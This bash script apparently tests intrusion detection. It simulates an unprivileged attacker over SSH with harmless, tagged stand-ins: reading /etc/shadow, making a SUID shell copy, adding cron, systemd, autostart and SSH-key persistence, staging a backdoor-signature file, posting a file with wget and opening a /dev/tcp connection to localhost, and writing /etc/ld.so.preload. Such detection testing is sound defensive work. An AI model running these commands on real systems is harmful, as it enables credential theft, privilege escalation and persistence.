#!/usr/bin/env bash
# Attacks by an ordinary user (no admin rights), run over an SSH session as
# the user "victim", so the audit log sees a real login. Every file name
# carries "legion-pt" so the evidence can be found. Nothing here harms the VM.
exec </dev/null
cat /etc/shadow
sudo -n id
cp /bin/sh ~/legion-pt-suid; chmod u+s ~/legion-pt-suid
(crontab -l 2>/dev/null; echo '* * * * * /bin/true # legion-pt-cron') | crontab -
printf '[Service]\nExecStart=/bin/true\n' >~/.config/systemd/user/legion-pt.service
printf '[Desktop Entry]\nType=Application\nExec=/bin/true\nName=legion-pt\n' >~/.config/autostart/legion-pt.desktop
echo 'ssh-ed25519 AAAAlegionptnotarealkey legion-pt' >>~/.ssh/authorized_keys
echo '# legion-pt' >>~/.bashrc
# A "downloaded tool": a harmless program carrying a string a published YARA
# rule looks for (the Exaramel backdoor's configuration key).
cp /bin/true /tmp/legion-pt-tool; printf 'odhyrfjcnfkdtslt\n' >>/tmp/legion-pt-tool; chmod 755 /tmp/legion-pt-tool
/tmp/legion-pt-tool
touch ~/legion-pt-share; chmod 777 ~/legion-pt-share
wget -q -T 2 --post-file=/etc/hostname http://127.0.0.1:9/
bash -c 'exec 3<>/dev/tcp/127.0.0.1/9'
head -c 1 /proc/1/mem
whoami; uname -a; cat /etc/passwd
echo x >/etc/ld.so.preload
exit 0
